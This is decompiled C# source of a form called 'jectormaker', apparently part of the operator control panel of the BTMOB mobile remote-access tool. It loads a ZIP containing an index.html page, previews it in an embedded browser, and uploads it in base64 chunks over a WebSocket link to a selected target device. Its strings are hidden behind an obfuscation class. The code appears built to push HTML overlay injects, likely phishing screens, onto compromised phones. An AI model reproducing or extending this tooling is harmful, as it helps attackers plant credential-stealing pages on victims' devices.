using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.WinForms;

namespace BTMOB;

[DesignerGenerated]
public class jectormaker : basestyle
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__73_002D0
	{
		public long _0024VB_0024Local_totalBytesTransferred_Upload;

		public long _0024VB_0024Local_sourceFileSizeBytes_Upload;

		public jectormaker _0024VB_0024Me;

		public VB_0024AnonymousDelegate_0 _0024I1;

		public _Closure_0024__73_002D0(_Closure_0024__73_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_totalBytesTransferred_Upload = arg0._0024VB_0024Local_totalBytesTransferred_Upload;
				_0024VB_0024Local_sourceFileSizeBytes_Upload = arg0._0024VB_0024Local_sourceFileSizeBytes_Upload;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			int num = checked((int)Math.Round((double)(_0024VB_0024Local_totalBytesTransferred_Upload * 100) / (double)_0024VB_0024Local_sourceFileSizeBytes_Upload));
			if (num > 100)
			{
				num = 100;
			}
			_0024VB_0024Me.uploadprogress.Value = num;
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("uploadworker")]
	private BackgroundWorker _uploadworker;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("injctbtn")]
	private DrakeUIButtonIcon _injctbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("closebtn")]
	private DrakeUIButtonIcon _closebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("adddata")]
	private DrakeUIButtonIcon _adddata;

	public string targetid;

	public string mobid;

	public ServersInfo srvinfo;

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("targeticon")]
	internal virtual PictureBox targeticon
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("targettitle")]
	internal virtual Label targettitle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("zippath")]
	internal virtual DrakeUITextBox zippath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("uploadprogress")]
	internal virtual DrakeUITrackBar uploadprogress
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2asd")]
	internal virtual DrakeWidth_W DrakeWidth_W2asd
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("statelabel")]
	internal virtual Label statelabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker uploadworker
	{
		[CompilerGenerated]
		get
		{
			return _uploadworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = uploadworker_DoWork;
			BackgroundWorker backgroundWorker = _uploadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_uploadworker = value;
			backgroundWorker = _uploadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon injctbtn
	{
		[CompilerGenerated]
		get
		{
			return _injctbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = injctbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _injctbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_injctbtn = value;
			drakeUIButtonIcon = _injctbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon closebtn
	{
		[CompilerGenerated]
		get
		{
			return _closebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = closebtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _closebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_closebtn = value;
			drakeUIButtonIcon = _closebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon adddata
	{
		[CompilerGenerated]
		get
		{
			return _adddata;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _adddata;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_adddata = value;
			drakeUIButtonIcon = _adddata;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("accssview")]
	internal virtual WebView2 accssview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public jectormaker()
	{
		base.Load += jectormaker_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.jectormaker));
		this.Panel2 = new System.Windows.Forms.Panel();
		this.targettitle = new System.Windows.Forms.Label();
		this.adddata = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.targeticon = new System.Windows.Forms.PictureBox();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.uploadprogress = new DrakeUI.Framework.DrakeUITrackBar();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.closebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W2asd = new DrakeUI.Framework.DrakeWidth_W();
		this.injctbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.zippath = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.accssview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.statelabel = new System.Windows.Forms.Label();
		this.uploadworker = new System.ComponentModel.BackgroundWorker();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.targeticon).BeginInit();
		this.Panel3.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.Panel5.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.accssview).BeginInit();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(413, 5);
		this.minibtn.Location = new System.Drawing.Point(455, 5);
		this.closbtn.Location = new System.Drawing.Point(497, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(529, 18);
		this.mytitle.Visible = false;
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(539, 26);
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.targettitle);
		this.Panel2.Controls.Add(this.adddata);
		this.Panel2.Controls.Add(this.targeticon);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(2, 64);
		this.Panel2.Name = EXGuarder._334F2029;
		this.Panel2.Padding = new System.Windows.Forms.Padding(4);
		this.Panel2.Size = new System.Drawing.Size(539, 46);
		this.Panel2.TabIndex = 40;
		this.targettitle.Dock = System.Windows.Forms.DockStyle.Fill;
		this.targettitle.Font = new System.Drawing.Font(EXGuarder._1C661437, 10f, System.Drawing.FontStyle.Bold);
		this.targettitle.ForeColor = System.Drawing.Color.Transparent;
		this.targettitle.Location = new System.Drawing.Point(61, 4);
		this.targettitle.Name = EXGuarder._37007268;
		this.targettitle.Size = new System.Drawing.Size(394, 38);
		this.targettitle.TabIndex = 43;
		this.targettitle.Text = EXGuarder._72190C60;
		this.targettitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.adddata.Cursor = System.Windows.Forms.Cursors.Hand;
		this.adddata.Dock = System.Windows.Forms.DockStyle.Right;
		this.adddata.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.adddata.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.adddata.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.adddata.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.adddata.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.adddata.Font = new System.Drawing.Font(EXGuarder._1C661437, 9f);
		this.adddata.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.adddata.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.adddata.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.adddata.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.adddata.Location = new System.Drawing.Point(455, 4);
		this.adddata.Name = EXGuarder._723E1709;
		this.adddata.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.adddata.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.adddata.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.adddata.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.adddata.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.adddata.Size = new System.Drawing.Size(80, 38);
		this.adddata.Style = DrakeUI.Framework.UIStyle.Custom;
		this.adddata.Symbol = 57437;
		this.adddata.TabIndex = 65;
		this.adddata.Text = EXGuarder._3A484F07;
		this.targeticon.Dock = System.Windows.Forms.DockStyle.Left;
		this.targeticon.Location = new System.Drawing.Point(4, 4);
		this.targeticon.Name = EXGuarder._78585873;
		this.targeticon.Size = new System.Drawing.Size(57, 38);
		this.targeticon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.targeticon.TabIndex = 0;
		this.targeticon.TabStop = false;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.uploadprogress);
		this.Panel3.Controls.Add(this.DrakeWidth_W3);
		this.Panel3.Controls.Add(this.closebtn);
		this.Panel3.Controls.Add(this.DrakeWidth_W2asd);
		this.Panel3.Controls.Add(this.injctbtn);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel3.Location = new System.Drawing.Point(2, 819);
		this.Panel3.Name = EXGuarder._052D1936;
		this.Panel3.Padding = new System.Windows.Forms.Padding(9);
		this.Panel3.Size = new System.Drawing.Size(539, 44);
		this.Panel3.TabIndex = 41;
		this.uploadprogress.DisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.uploadprogress.Dock = System.Windows.Forms.DockStyle.Fill;
		this.uploadprogress.Enabled = false;
		this.uploadprogress.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.uploadprogress.Font = new System.Drawing.Font(EXGuarder._1C661437, 12f);
		this.uploadprogress.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.uploadprogress.Location = new System.Drawing.Point(9, 9);
		this.uploadprogress.Name = EXGuarder._316A1741;
		this.uploadprogress.ReadOnly = true;
		this.uploadprogress.RectColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.uploadprogress.Size = new System.Drawing.Size(205, 26);
		this.uploadprogress.Style = DrakeUI.Framework.UIStyle.Custom;
		this.uploadprogress.TabIndex = 44;
		this.uploadprogress.Text = EXGuarder._3A51573D;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(214, 9);
		this.DrakeWidth_W3.Name = EXGuarder._1044064A;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(10, 26);
		this.DrakeWidth_W3.TabIndex = 66;
		this.closebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.closebtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.closebtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.closebtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closebtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.closebtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.closebtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.closebtn.Font = new System.Drawing.Font(EXGuarder._1C661437, 9f);
		this.closebtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.closebtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closebtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closebtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.closebtn.Location = new System.Drawing.Point(224, 9);
		this.closebtn.Name = EXGuarder._20331B01;
		this.closebtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.closebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.closebtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closebtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closebtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closebtn.Size = new System.Drawing.Size(148, 26);
		this.closebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.closebtn.Symbol = 61453;
		this.closebtn.TabIndex = 65;
		this.closebtn.Text = EXGuarder._15495A0A;
		this.DrakeWidth_W2asd.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2asd.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W2asd.Location = new System.Drawing.Point(372, 9);
		this.DrakeWidth_W2asd.Name = EXGuarder._78125F38;
		this.DrakeWidth_W2asd.Size = new System.Drawing.Size(10, 26);
		this.DrakeWidth_W2asd.TabIndex = 54;
		this.injctbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.injctbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.injctbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.injctbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.injctbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.injctbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.injctbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.injctbtn.Font = new System.Drawing.Font(EXGuarder._1C661437, 9f);
		this.injctbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.injctbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.injctbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.injctbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.injctbtn.Location = new System.Drawing.Point(382, 9);
		this.injctbtn.Name = EXGuarder._4A546C74;
		this.injctbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.injctbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.injctbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.injctbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.injctbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.injctbtn.Size = new System.Drawing.Size(148, 26);
		this.injctbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.injctbtn.Symbol = 61671;
		this.injctbtn.TabIndex = 64;
		this.injctbtn.Text = EXGuarder._6C3E0718;
		this.Panel4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel4.Controls.Add(this.zippath);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel4.Location = new System.Drawing.Point(2, 110);
		this.Panel4.Name = EXGuarder._305B3748;
		this.Panel4.Padding = new System.Windows.Forms.Padding(9);
		this.Panel4.Size = new System.Drawing.Size(539, 45);
		this.Panel4.TabIndex = 42;
		this.zippath.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.zippath.Dock = System.Windows.Forms.DockStyle.Fill;
		this.zippath.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.zippath.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.zippath.Font = new System.Drawing.Font(EXGuarder._1C661437, 9f);
		this.zippath.ForeColor = System.Drawing.Color.White;
		this.zippath.Location = new System.Drawing.Point(9, 9);
		this.zippath.Margin = new System.Windows.Forms.Padding(4);
		this.zippath.Maximum = 2147483647.0;
		this.zippath.Minimum = -2147483648.0;
		this.zippath.Name = EXGuarder._30694372;
		this.zippath.Padding = new System.Windows.Forms.Padding(4);
		this.zippath.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.zippath.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.zippath.Size = new System.Drawing.Size(521, 25);
		this.zippath.Style = DrakeUI.Framework.UIStyle.Custom;
		this.zippath.TabIndex = 22;
		this.zippath.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.zippath.Watermark = EXGuarder._44296F3D;
		this.Panel5.Controls.Add(this.accssview);
		this.Panel5.Controls.Add(this.statelabel);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel5.Location = new System.Drawing.Point(2, 155);
		this.Panel5.Name = EXGuarder._4F0C0E26;
		this.Panel5.Size = new System.Drawing.Size(539, 664);
		this.Panel5.TabIndex = 43;
		this.accssview.AllowExternalDrop = true;
		this.accssview.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.accssview.CreationProperties = null;
		this.accssview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.accssview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.accssview.ForeColor = System.Drawing.Color.White;
		this.accssview.Location = new System.Drawing.Point(0, 0);
		this.accssview.Name = EXGuarder._5A24793A;
		this.accssview.Size = new System.Drawing.Size(539, 637);
		this.accssview.TabIndex = 45;
		this.accssview.ZoomFactor = 1.0;
		this.statelabel.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.statelabel.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.statelabel.Font = new System.Drawing.Font(EXGuarder._1C661437, 9f);
		this.statelabel.ForeColor = System.Drawing.Color.Transparent;
		this.statelabel.Location = new System.Drawing.Point(0, 637);
		this.statelabel.Name = EXGuarder._2D5F6D67;
		this.statelabel.Padding = new System.Windows.Forms.Padding(4);
		this.statelabel.Size = new System.Drawing.Size(539, 27);
		this.statelabel.TabIndex = 44;
		this.statelabel.Text = EXGuarder._084F102E;
		this.statelabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(543, 865);
		base.Controls.Add(this.Panel5);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel2);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._606A042A);
		base.Name = EXGuarder._0E567175;
		this.Text = EXGuarder._0E567175;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		base.Controls.SetChildIndex(this.Panel4, 0);
		base.Controls.SetChildIndex(this.Panel5, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.targeticon).EndInit();
		this.Panel3.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.accssview).EndInit();
		base.ResumeLayout(false);
	}

	private async void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog
		{
			Filter = "ZIP Files (*.zip)|*.zip|All Files (*.*)|*.*",
			Title = "Select a ZIP File"
		};
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string fileName = openFileDialog.FileName;
		if (Operators.CompareString(Path.GetExtension(fileName).ToLower(), ".zip", TextCompare: false) != 0)
		{
			BTAlerter.erroes("ZIP file only.");
			return;
		}
		List<string> list = codes.ListZipFileNames(fileName);
		if (list == null)
		{
			BTAlerter.infos("The selected file is not a valid ZIP archive");
			return;
		}
		if (!list.Contains("index.html"))
		{
			BTAlerter.infos(BTConst.noindxstr);
			return;
		}
		zippath.Text = fileName;
		injctbtn.Enabled = true;
		statelabel.Text = BTConst.statesstr + ": " + BTConst.readystr;
		string text = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
		Directory.CreateDirectory(text);
		ZipFile.ExtractToDirectory(fileName, text);
		string text2 = Path.Combine(text, "index.html");
		if (File.Exists(text2))
		{
			await accssview.EnsureCoreWebView2Async();
			accssview.CoreWebView2.Navigate(new Uri(text2).AbsoluteUri);
		}
		else
		{
			BTAlerter.erroes("index.html was not found after extraction.");
		}
	}

	private async void jectormaker_Load(object sender, EventArgs e)
	{
		targettitle.Text = $"{BTConst.trgetstr}: " + targetid;
		statelabel.Text = BTConst.statesstr + ": " + BTConst.waitngstr;
		await accssview.EnsureCoreWebView2Async();
		accssview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		accssview.CoreWebView2.Settings.AreDevToolsEnabled = false;
	}

	private void uploadworker_DoWork(object sender, DoWorkEventArgs e)
	{
		_Closure_0024__73_002D0 arg = default(_Closure_0024__73_002D0);
		_Closure_0024__73_002D0 CS_0024_003C_003E8__locals10 = new _Closure_0024__73_002D0(arg);
		CS_0024_003C_003E8__locals10._0024VB_0024Me = this;
		string text = zippath.Text;
		FileInfo fileInfo = new FileInfo(text);
		CS_0024_003C_003E8__locals10._0024VB_0024Local_sourceFileSizeBytes_Upload = fileInfo.Length;
		int num = codes.CalculateBufferSize(CS_0024_003C_003E8__locals10._0024VB_0024Local_sourceFileSizeBytes_Upload);
		checked
		{
			byte[] array = new byte[num - 1 + 1];
			CS_0024_003C_003E8__locals10._0024VB_0024Local_totalBytesTransferred_Upload = 0L;
			int num2 = 0;
			string value = codes.CalculateMD5(text);
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				statelabel.Text = BTConst.statesstr + EXGuarder._4F003B76 + BTConst.snddatastr;
			}));
			using (FileStream fileStream = new FileStream(text, FileMode.Open, FileAccess.Read))
			{
				int num3;
				do
				{
					num3 = fileStream.Read(array, 0, array.Length);
					if (num3 <= 0)
					{
						continue;
					}
					CS_0024_003C_003E8__locals10._0024VB_0024Local_totalBytesTransferred_Upload += num3;
					string value2 = Convert.ToBase64String(array, 0, num3);
					Dictionary<string, object> dictionary = new Dictionary<string, object>();
					dictionary.Add(EXGuarder._6F793A67, value);
					dictionary.Add(EXGuarder._3C1F0234, EXGuarder._52026837);
					dictionary.Add(EXGuarder._19197839, EXGuarder._404B714B);
					dictionary.Add(EXGuarder._1D3D4B14, targetid);
					dictionary.Add(EXGuarder._14381D2E, fileInfo.Name);
					dictionary.Add(EXGuarder._15446C4A, value2);
					dictionary.Add(EXGuarder._0E146B45, CS_0024_003C_003E8__locals10._0024VB_0024Local_sourceFileSizeBytes_Upload);
					dictionary.Add(EXGuarder._5A345E3A, CS_0024_003C_003E8__locals10._0024VB_0024Local_totalBytesTransferred_Upload);
					dictionary.Add(EXGuarder._3F730054, num2);
					dictionary.Add(EXGuarder._02692306, EXGuarder._44032223);
					Dictionary<string, object> chatData = dictionary;
					BTEngine.commands(chatData, mobid, srvinfo.WSClient);
					num2++;
					Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						int num4 = (int)Math.Round((double)(CS_0024_003C_003E8__locals10._0024VB_0024Local_totalBytesTransferred_Upload * 100) / (double)CS_0024_003C_003E8__locals10._0024VB_0024Local_sourceFileSizeBytes_Upload);
						if (num4 > 100)
						{
							num4 = 100;
						}
						CS_0024_003C_003E8__locals10._0024VB_0024Me.uploadprogress.Value = num4;
					}));
					Thread.Sleep(10);
				}
				while (num3 > 0);
			}
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				uploadprogress.ForeColor = Color.Lime;
				statelabel.Text = BTConst.statesstr + EXGuarder._130A2E2C + BTConst.compltstr;
				injctbtn.Visible = false;
				closebtn.Enabled = true;
				closebtn.Visible = true;
			}));
		}
	}

	private void injctbtn_Click(object sender, EventArgs e)
	{
		string text = zippath.Text;
		if (codes.StrisEmpty(text))
		{
			BTAlerter.infos(EXGuarder._35755C28);
		}
		else if (!File.Exists(text))
		{
			BTAlerter.infos(EXGuarder._0B5D0C76);
		}
		else if (!uploadworker.IsBusy)
		{
			uploadworker.RunWorkerAsync();
		}
	}

	private void closebtn_Click(object sender, EventArgs e)
	{
		uploadworker.Dispose();
		Close();
	}
}
